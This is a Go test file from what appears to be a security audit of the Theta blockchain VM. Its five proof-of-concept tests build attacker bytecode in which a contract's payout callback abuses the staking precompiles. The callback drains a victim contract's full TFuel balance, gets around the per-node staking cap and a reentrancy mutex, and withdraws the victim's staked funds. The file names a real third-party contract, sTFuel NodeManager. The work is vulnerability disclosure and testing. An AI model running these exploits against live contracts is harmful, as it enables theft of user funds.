package vm

// AUDIT PoC H - the "payout to msg.sender" callback drain (sTFuel NodeManager class).
//
// Family F established that the staking precompiles take the *owner* of the funds
// from `contract.CallerAddress`:
//
//	ledger/vm/contracts.go:104   callerAddr := contract.CallerAddress
//	ledger/vm/contracts.go:519   StakeToEEN(evm.StateDB, callerAddr, summary, tfuelWeiAmount)
//	ledger/vm/contract.go:125    AsDelegate(): c.CallerAddress = parent.CallerAddress
//	ledger/vm/vm.go:203          if db.GetBalance(sender).Cmp(amount) < 0 { return false }
//	ledger/vm/vm.go:216          db.SubBalance(sender, amount)
//
// H answers a different question than F: what does a contract need to do to be
// drained this way? F's victim had to *re-enter* the attacker (an outgoing call).
// H proves the strictly weaker precondition that real payout contracts satisfy:
// the victim only has to perform ONE outgoing call to an address the attacker
// controls - a `claim()`/`refund()`/`hook()` that pays `msg.sender`. The value of
// that call is irrelevant (H1 pays 1000 wei, i.e. a *deducted* reward, and the
// drain still takes the whole remaining balance, because the attacker reads the
// live balance with the BALANCE opcode instead of a hardcoded amount).
//
// H2 additionally shows that the 500,000 TFuel per-EEN cap enforced in
// ledger/state/elite_edge_node_pool.go:216-223 does not bound the theft: it is a
// per-EEN cap, so a 1.37M TFuel contract is drained in one transaction by
// chunking across several attacker-registered EENs.

import (
	"encoding/hex"
	"math/big"
	"testing"

	"github.com/thetatoken/theta/common"
	"github.com/thetatoken/theta/crypto/bls"
	"github.com/thetatoken/theta/ledger/state"
)

// ---------------------------------------------------------------------------
// bytecode helpers
// ---------------------------------------------------------------------------

func push2(v int) []byte { return []byte{0x61, byte(v >> 8), byte(v)} }

// mstoreWord emits: PUSH32 word ; PUSH2 off ; MSTORE
func mstoreWord(off int, word []byte) []byte {
	out := append([]byte{0x7f}, word...)
	out = append(out, push2(off)...)
	return append(out, 0x52)
}

// mstoreBalance emits: PUSH20 addr ; BALANCE ; PUSH2 off ; MSTORE
// (the amount is read from the live state, not baked into the code)
func mstoreBalance(addr common.Address, off int) []byte {
	out := []byte{0x73}
	out = append(out, addr.Bytes()...)
	out = append(out, 0x31) // BALANCE
	out = append(out, push2(off)...)
	return append(out, 0x52)
}

// delegateStakeToEEN emits DELEGATECALL(0xCE, in = mem[0:293]) ; POP
// (the input is <summary 229><32 zero padding><amount 32> - amount lives at 261)
func delegateStakeToEEN() []byte {
	return []byte{
		0x60, 0x00, // outSize
		0x60, 0x00, // outOffset
		0x61, 0x01, 0x25, // inSize = 293
		0x60, 0x00, // inOffset
		0x60, 0xce, // to = 0xCE
		0x5a, // GAS
		0xf4, // DELEGATECALL
		0x50, // POP
	}
}

// eenSummaryWords writes a 229-byte EEN summary into mem[0:256].
func eenSummaryWords(summary []byte) []byte {
	buf := make([]byte, 256)
	copy(buf, summary)
	var b []byte
	for i := 0; i < 256; i += 32 {
		b = append(b, mstoreWord(i, buf[i:i+32])...)
	}
	return b
}

// claimRuntime models a payout function: it pays `msg.sender` a fixed reward and
// stops. The reward is transferred *before* anything else happens, i.e. the
// contract has already deducted it from its balance when the attacker runs.
//
//	CALL(gas, CALLER, 1000 wei, 0, 0, 0, 0) ; STOP
func claimRuntime() string {
	return "6000" + "6000" + "6000" + "6000" + "6103e8" + "33" + "5a" + "f1" + "00"
}

// ---------------------------------------------------------------------------
// H1: one payout to msg.sender drains the payer's whole TFuel balance
// ---------------------------------------------------------------------------

func TestAuditH1_ClaimPayoutDrainsPayerTFuel(t *testing.T) {
	sk, err := bls.RandKey()
	if err != nil {
		t.Fatalf("bls keygen: %v", err)
	}
	pub := sk.PublicKey()
	pop := sk.PopProve()

	eenAddr := common.HexToAddress("0xEE00000000000000000000000000000000000011")
	payee := common.HexToAddress("0xD099000000000000000000000000000000000001") // victim: payout contract
	sv := newAuditView(t)

	// attacker pre-registers an EEN (costs him 10,000 TFuel, which stays his)
	eenp := state.NewEliteEdgeNodePool(sv, false)
	if err := eenp.DepositStake(attackerEOA, eenAddr, tfuelN(10000), pub, sv.GetBlockHeight()); err != nil {
		t.Fatalf("attacker EEN registration: %v", err)
	}
	setBalance(t, sv, attackerEOA, big.NewInt(0), big.NewInt(0))

	// victim holds 250,000 TFuel and exposes claim(): pay msg.sender 1000 wei
	victimTFuel := tfuelN(250000)
	setBalance(t, sv, payee, big.NewInt(0), victimTFuel)
	setCode(t, sv, payee, claimRuntime())

	// attacker contract: when the EOA calls it, it calls claim(); when the payout
	// contract calls it back, it runs the drain (amount = BALANCE(payee)).
	body := append(eenSummaryWords(blsSummary(t, eenAddr, pub, pop)), mstoreBalance(payee, 261)...)
	body = append(body, delegateStakeToEEN()...)
	body = append(body, 0x00)
	setCode(t, sv, attackerCtr, hex.EncodeToString(dispatcher(attackerEOA, payee, hex.EncodeToString(body))))
	setBalance(t, sv, attackerCtr, big.NewInt(0), big.NewInt(0))

	tx := smartTx(attackerEOA, attackerCtr, nil, 8_000_000)
	_, _, gasUsed, err := Execute(NewBlockInfo(auditHeight, big.NewInt(1), "mainnet"), tx, sv)
	if err != nil {
		t.Fatalf("tx failed: %v", err)
	}
	t.Logf("gas used for the whole callback drain = %v", gasUsed)

	staked := eenp2GetStake(t, sv, eenAddr, payee)
	expected := new(big.Int).Sub(victimTFuel, big.NewInt(1000)) // reward already paid out
	t.Logf("payee TFuel after claim      = %v", tfuelOf(sv, payee))
	t.Logf("attacker contract TFuel      = %v (the 1000 wei reward)", tfuelOf(sv, attackerCtr))
	t.Logf("stake in attacker's EEN      = %v (source = payee)", staked)

	if tfuelOf(sv, payee).Sign() != 0 {
		t.Fatalf("payee still holds %v TFuel", tfuelOf(sv, payee))
	}
	if staked == nil || staked.Cmp(expected) != 0 {
		t.Fatalf("expected a %v TFuel stake sourced from the payee, got %v", expected, staked)
	}
}

// ---------------------------------------------------------------------------
// H2: the 500k per-EEN cap does not bound the theft (chunking, one tx)
// ---------------------------------------------------------------------------

func TestAuditH2_CapBypassDrains137MTFuelInOneTx(t *testing.T) {
	type een struct {
		addr    common.Address
		pub     *bls.PublicKey
		pop     *bls.Signature
		summary []byte
	}
	eens := make([]een, 3)
	for i := range eens {
		sk, err := bls.RandKey()
		if err != nil {
			t.Fatalf("bls keygen: %v", err)
		}
		eens[i] = een{
			addr: common.HexToAddress(map[int]string{
				0: "0xEE00000000000000000000000000000000000021",
				1: "0xEE00000000000000000000000000000000000022",
				2: "0xEE00000000000000000000000000000000000023",
			}[i]),
			pub: sk.PublicKey(),
			pop: sk.PopProve(),
		}
	}

	payee := common.HexToAddress("0xD099000000000000000000000000000000000002")
	sv := newAuditView(t)

	pool := state.NewEliteEdgeNodePool(sv, false)
	for i := range eens {
		if err := pool.DepositStake(attackerEOA, eens[i].addr, tfuelN(10000), eens[i].pub, sv.GetBlockHeight()); err != nil {
			t.Fatalf("attacker EEN registration %d: %v", i, err)
		}
		eens[i].summary = blsSummary(t, eens[i].addr, eens[i].pub, eens[i].pop)
	}
	setBalance(t, sv, attackerEOA, big.NewInt(0), big.NewInt(0))

	victimTFuel := tfuelN(1370000) // the sTFuel NodeManager order of magnitude
	setBalance(t, sv, payee, big.NewInt(0), victimTFuel)
	setCode(t, sv, payee, claimRuntime())

	// MaxEliteEdgeNodeStakeDeposit is 500,000 and the pool checks
	// currentStake+amount, so each EEN can absorb 490,000 on top of the 10,000
	// the attacker already staked there when registering it.
	chunk := tfuelN(490000)
	body := []byte{}
	// chunk 1: 500,000 -> EEN1
	body = append(body, eenSummaryWords(eens[0].summary)...)
	body = append(body, mstoreWord(261, rightPad32(chunk.Bytes()))...)
	body = append(body, delegateStakeToEEN()...)
	// chunk 2: 500,000 -> EEN2
	body = append(body, eenSummaryWords(eens[1].summary)...)
	body = append(body, mstoreWord(261, rightPad32(chunk.Bytes()))...)
	body = append(body, delegateStakeToEEN()...)
	// chunk 3: whatever is left (370,000) -> EEN3
	body = append(body, eenSummaryWords(eens[2].summary)...)
	body = append(body, mstoreBalance(payee, 261)...)
	body = append(body, delegateStakeToEEN()...)
	body = append(body, 0x00)

	setCode(t, sv, attackerCtr, hex.EncodeToString(dispatcher(attackerEOA, payee, hex.EncodeToString(body))))
	setBalance(t, sv, attackerCtr, big.NewInt(0), big.NewInt(0))

	if _, err := runTx(t, sv, attackerEOA, attackerCtr, nil, 15_000_000, big.NewInt(0), big.NewInt(0)); err != nil {
		t.Fatalf("tx failed: %v", err)
	}

	// the claim paid the 1000 wei reward before the drain started
	rest := new(big.Int).Sub(victimTFuel, new(big.Int).Mul(chunk, big.NewInt(2)))
	rest = rest.Sub(rest, big.NewInt(1000))
	want := []*big.Int{chunk, chunk, rest}
	for i := range eens {
		got := eenp2GetStake(t, sv, eens[i].addr, payee)
		t.Logf("EEN %d (%v): stake sourced from payee = %v", i, eens[i].addr.Hex(), got)
		if got == nil || got.Cmp(want[i]) != 0 {
			t.Fatalf("EEN %d: expected %v, got %v", i, want[i], got)
		}
	}
	t.Logf("payee TFuel after drain     = %v", tfuelOf(sv, payee))
	t.Logf("total EEN stake             = %v", sv.GetTotalEENStake())
	if tfuelOf(sv, payee).Sign() != 0 {
		t.Fatalf("payee still holds %v TFuel", tfuelOf(sv, payee))
	}
}

// ---------------------------------------------------------------------------
// H3: no value is needed at all - a zero-value *notification* hook
// (onTokenTransfer / notify / "call me back") is enough, because the callback
// frame's CallerAddress is the victim regardless of the transferred amount.
// ---------------------------------------------------------------------------

func TestAuditH3_ZeroValueHookIsEnough(t *testing.T) {
	sk, err := bls.RandKey()
	if err != nil {
		t.Fatalf("bls keygen: %v", err)
	}
	pub := sk.PublicKey()
	pop := sk.PopProve()

	eenAddr := common.HexToAddress("0xEE00000000000000000000000000000000000031")
	notifier := common.HexToAddress("0xD099000000000000000000000000000000000003")
	sv := newAuditView(t)

	pool := state.NewEliteEdgeNodePool(sv, false)
	if err := pool.DepositStake(attackerEOA, eenAddr, tfuelN(10000), pub, sv.GetBlockHeight()); err != nil {
		t.Fatalf("attacker EEN registration: %v", err)
	}
	setBalance(t, sv, attackerEOA, big.NewInt(0), big.NewInt(0))

	victimTFuel := tfuelN(120000)
	setBalance(t, sv, notifier, big.NewInt(0), victimTFuel)
	setCode(t, sv, notifier, victimCallbackToSender()) // CALL(gas, CALLER, 0, ...)

	body := append(eenSummaryWords(blsSummary(t, eenAddr, pub, pop)), mstoreBalance(notifier, 261)...)
	body = append(body, delegateStakeToEEN()...)
	body = append(body, 0x00)
	setCode(t, sv, attackerCtr, hex.EncodeToString(dispatcher(attackerEOA, notifier, hex.EncodeToString(body))))
	setBalance(t, sv, attackerCtr, big.NewInt(0), big.NewInt(0))

	if _, err := runTx(t, sv, attackerEOA, attackerCtr, nil, 8_000_000, big.NewInt(0), big.NewInt(0)); err != nil {
		t.Fatalf("tx failed: %v", err)
	}

	staked := eenp2GetStake(t, sv, eenAddr, notifier)
	t.Logf("notifier TFuel (zero-value hook) = %v", tfuelOf(sv, notifier))
	t.Logf("stake sourced from notifier      = %v", staked)
	if tfuelOf(sv, notifier).Sign() != 0 || staked == nil || staked.Cmp(victimTFuel) != 0 {
		t.Fatalf("zero-value hook did not drain: balance %v stake %v", tfuelOf(sv, notifier), staked)
	}
}

// ---------------------------------------------------------------------------
// H4: a genuine reentrancy mutex does not stop the drain
// ---------------------------------------------------------------------------

// The real sTFuel NodeManager (github.com/sTFuel/sTFuel, commit 26bd340,
// packages/smart-contracts/nodeManager.sol) guards every payout entry point with
// `nonReentrant` (:546 claimHeadIfReady, :589 directRedeem, :606 withdrawCredits)
// and pays with `payable(to).call{value: amount}("")` (:891-894, all gas).
//
// The mutex only blocks re-entry INTO the NodeManager. The attack never re-enters
// it: the callback calls the 0xCE precompile, which resolves the owner of the
// funds from `contract.CallerAddress` (contracts.go:104,519) - i.e. the
// NodeManager - without any NodeManager code running.
//
// H4 models the guarded function faithfully (lock slot 0, set on entry, cleared
// on exit) and proves three things at once:
//   - the lock IS enforced (a nested call into the payout contract reverts),
//   - the payout callback still drains the whole balance,
//   - the lock is cleanly released afterwards (no trace of the attack).

// nmLikeRuntime models the guarded payout function:
//
//	if (slot0 != 0) revert;      // nonReentrant
//	slot0 = 1;
//	CALL(gas, CALLER, 1000, 0, 0, 0, 0);   // _pay(msg.sender, reward)
//	slot0 = 0;
//	stop
func nmLikeRuntime() string {
	var code []byte
	code = append(code, 0x60, 0x00, 0x54)             // PUSH1 0 ; SLOAD   -> [lock]
	jumpiPos := len(code)                             //
	code = append(code, 0x60, 0x00, 0x57)             // PUSH1 dest ; JUMPI
	code = append(code, 0x60, 0x01, 0x60, 0x00, 0x55) // lock = 1
	code = append(code, 0x60, 0x00, 0x60, 0x00, 0x60, 0x00, 0x60, 0x00, // outSize,outOff,inSize,inOff
		0x61, 0x03, 0xe8, // value = 1000 wei
		0x33, // CALLER  (the `to` of _pay: the outer msg.sender)
		0x5a, 0xf1, 0x50) // GAS ; CALL ; POP
	code = append(code, 0x60, 0x00, 0x60, 0x00, 0x55) // lock = 0
	code = append(code, 0x00)                         // STOP
	revertDest := len(code)
	code = append(code, 0x5b, 0x60, 0x00, 0x60, 0x00, 0xfd) // JUMPDEST ; REVERT(0,0)
	code[jumpiPos+1] = byte(revertDest)
	return hex.EncodeToString(code)
}

// reenterProbeBody: try to re-enter the payout contract (this is what the mutex
// blocks), record the result in the attacker's slot 0, then drain via 0xCE.
func reenterProbeBody(nm common.Address, summary []byte) []byte {
	body := []byte{0x60, 0x00, 0x60, 0x00, 0x60, 0x00, 0x60, 0x00, 0x60, 0x00} // outSize,outOff,inSize,inOff,value=0
	body = append(body, 0x73)
	body = append(body, nm.Bytes()...)
	body = append(body, 0x5a, 0xf1) // GAS ; CALL -> [ok]
	body = append(body, 0x60, 0x00, 0x55) // SSTORE(0, ok): 0 == re-entry was rejected
	body = append(body, eenSummaryWords(summary)...)
	body = append(body, mstoreBalance(nm, 261)...)
	body = append(body, delegateStakeToEEN()...)
	return append(body, 0x00)
}

func TestAuditH4_ReentrancyMutexDoesNotProtectTheBalance(t *testing.T) {
	sk, err := bls.RandKey()
	if err != nil {
		t.Fatalf("bls keygen: %v", err)
	}
	pub := sk.PublicKey()
	pop := sk.PopProve()

	eenAddr := common.HexToAddress("0xEE00000000000000000000000000000000000044")
	nm := common.HexToAddress("0xD099000000000000000000000000000000000004") // NodeManager stand-in
	sv := newAuditView(t)

	eenp := state.NewEliteEdgeNodePool(sv, false)
	if err := eenp.DepositStake(attackerEOA, eenAddr, tfuelN(10000), pub, sv.GetBlockHeight()); err != nil {
		t.Fatalf("attacker EEN registration: %v", err)
	}
	setBalance(t, sv, attackerEOA, big.NewInt(0), big.NewInt(0))

	// the NodeManager holds backing TFuel and exposes the guarded payout
	nmTFuel := tfuelN(250000) // single EEN stake: the 500k per-EEN cap applies
	setBalance(t, sv, nm, big.NewInt(0), nmTFuel)
	setCode(t, sv, nm, nmLikeRuntime())

	body := reenterProbeBody(nm, blsSummary(t, eenAddr, pub, pop))
	setCode(t, sv, attackerCtr, hex.EncodeToString(dispatcher(attackerEOA, nm, hex.EncodeToString(body))))
	setBalance(t, sv, attackerCtr, big.NewInt(0), big.NewInt(0))

	if _, err := runTx(t, sv, attackerEOA, attackerCtr, nil, 8_000_000, big.NewInt(0), big.NewInt(0)); err != nil {
		t.Fatalf("tx failed: %v", err)
	}

	reentry := sv.GetState(attackerCtr, common.Hash{})
	staked := eenp2GetStake(t, sv, eenAddr, nm)
	expected := new(big.Int).Sub(nmTFuel, big.NewInt(1000))

	t.Logf("nested re-entry into the payout contract returned ok = %v (0 = mutex held)", reentry.Big())
	t.Logf("NodeManager TFuel after the payout = %v", tfuelOf(sv, nm))
	t.Logf("attacker contract TFuel           = %v (the 1000 wei reward)", tfuelOf(sv, attackerCtr))
	t.Logf("stake sourced from the NodeManager = %v", staked)

	if reentry != (common.Hash{}) {
		t.Fatalf("expected the mutex to reject the nested call, got ok=%v", reentry.Big())
	}
	if tfuelOf(sv, nm).Sign() != 0 {
		t.Fatalf("NodeManager still holds %v TFuel", tfuelOf(sv, nm))
	}
	if staked == nil || staked.Cmp(expected) != 0 {
		t.Fatalf("expected a %v TFuel stake sourced from the NodeManager, got %v", expected, staked)
	}
	if sv.GetState(nm, common.Hash{}) != (common.Hash{}) {
		t.Fatalf("lock was not released: %v", sv.GetState(nm, common.Hash{}))
	}
}

// ---------------------------------------------------------------------------
// H5: the same callback also queues the NodeManager's *staked* TFuel for return
// ---------------------------------------------------------------------------

// 0xCF (UnstakeFromEEN) also resolves the owner from `contract.CallerAddress`
// (contracts.go:539-541 -> vm.go:222-243 -> WithdrawStake(source, holder)).
// Inside the payout callback that address is the NodeManager, so the attacker can
// withdraw the NodeManager's EEN stakes - the part of the TVL that a naive reader
// would consider "safely staked". ledger/ledger.go:740-742 then credits the
// returned principal to `returnedStake.Source` (= the NodeManager) once
// ReturnHeight is reached, where a second, identical callback sweeps it.

// delegateUnstake emits DELEGATECALL(0xCF, in = mem[0:20]) ; POP
func delegateUnstake() []byte {
	return []byte{
		0x60, 0x00, // outSize
		0x60, 0x00, // outOffset
		0x60, 0x14, // inSize = 20 (the EEN address)
		0x60, 0x00, // inOffset
		0x60, 0xcf, // to = 0xCF
		0x5a,       // GAS
		0xf4,       // DELEGATECALL
		0x50,       // POP
	}
}

func TestAuditH5_CallbackAlsoQueuesTheStakedTVL(t *testing.T) {
	sk, err := bls.RandKey()
	if err != nil {
		t.Fatalf("bls keygen: %v", err)
	}
	pub := sk.PublicKey()
	pop := sk.PopProve()

	attEen := common.HexToAddress("0xEE00000000000000000000000000000000000055")
	nmEen := common.HexToAddress("0xEE00000000000000000000000000000000000066") // NodeManager's own EEN
	nm := common.HexToAddress("0xD099000000000000000000000000000000000005")
	sv := newAuditView(t)
	eenp := state.NewEliteEdgeNodePool(sv, false)

	if err := eenp.DepositStake(attackerEOA, attEen, tfuelN(10000), pub, sv.GetBlockHeight()); err != nil {
		t.Fatalf("attacker EEN: %v", err)
	}
	if err := eenp.DepositStake(nm, nmEen, tfuelN(200000), pub, sv.GetBlockHeight()); err != nil {
		t.Fatalf("NodeManager EEN: %v", err)
	}
	setBalance(t, sv, attackerEOA, big.NewInt(0), big.NewInt(0))

	nmLiquid := tfuelN(250000)
	setBalance(t, sv, nm, big.NewInt(0), nmLiquid)
	setCode(t, sv, nm, nmLikeRuntime())

	// callback: drain the liquid balance into the attacker's EEN, then pull the
	// NodeManager's own EEN stake into the return queue.
	body := eenSummaryWords(blsSummary(t, attEen, pub, pop))
	body = append(body, mstoreBalance(nm, 261)...)
	body = append(body, delegateStakeToEEN()...)
	nmEenWord := make([]byte, 32)
	copy(nmEenWord[0:20], nmEen.Bytes()) // 0xCF reads the address from input[0:20]
	body = append(body, mstoreWord(0, nmEenWord)...)
	body = append(body, delegateUnstake()...)
	body = append(body, 0x00)

	setCode(t, sv, attackerCtr, hex.EncodeToString(dispatcher(attackerEOA, nm, hex.EncodeToString(body))))
	setBalance(t, sv, attackerCtr, big.NewInt(0), big.NewInt(0))

	if _, err := runTx(t, sv, attackerEOA, attackerCtr, nil, 8_000_000, big.NewInt(0), big.NewInt(0)); err != nil {
		t.Fatalf("tx failed: %v", err)
	}

	liquidStake := eenp2GetStake(t, sv, attEen, nm)
	nmEenStake := eenp2GetStake(t, sv, nmEen, nm)
	nmEenObj := eenp.Get(nmEen)
	returnHeight := uint64(0)
	if nmEenObj != nil && len(nmEenObj.Stakes) == 1 {
		returnHeight = nmEenObj.Stakes[0].ReturnHeight
	}
	queue := sv.GetEliteEdgeNodeStakeReturns(returnHeight)

	t.Logf("NodeManager liquid TFuel after the tx      = %v", tfuelOf(sv, nm))
	t.Logf("stake now held by the attacker's EEN       = %v (source = NodeManager)", liquidStake)
	t.Logf("stake left in the NodeManager's own EEN    = %v", nmEenStake)
	if nmEenObj != nil && len(nmEenObj.Stakes) == 1 {
		t.Logf("  withdrawn = %v, returnHeight = %v (now + ReturnLockingPeriod)",
			nmEenObj.Stakes[0].Withdrawn, nmEenObj.Stakes[0].ReturnHeight)
	}
	t.Logf("return-queue entries at height %v          = %v", returnHeight, len(queue))
	for _, q := range queue {
		t.Logf("  queued: holder %v source %v amount %v", q.Holder.Hex(), q.Stake.Source.Hex(), q.Stake.Amount)
	}

	if tfuelOf(sv, nm).Sign() != 0 {
		t.Fatalf("liquid balance not drained: %v", tfuelOf(sv, nm))
	}
	if liquidStake == nil || liquidStake.Cmp(new(big.Int).Sub(nmLiquid, big.NewInt(1000))) != 0 {
		t.Fatalf("liquid drain failed, stake = %v", liquidStake)
	}
	if len(queue) != 1 || queue[0].Stake.Source != nm || queue[0].Stake.Amount.Cmp(tfuelN(200000)) != 0 {
		t.Fatalf("NodeManager's staked TVL was not queued for return: %+v", queue)
	}
}
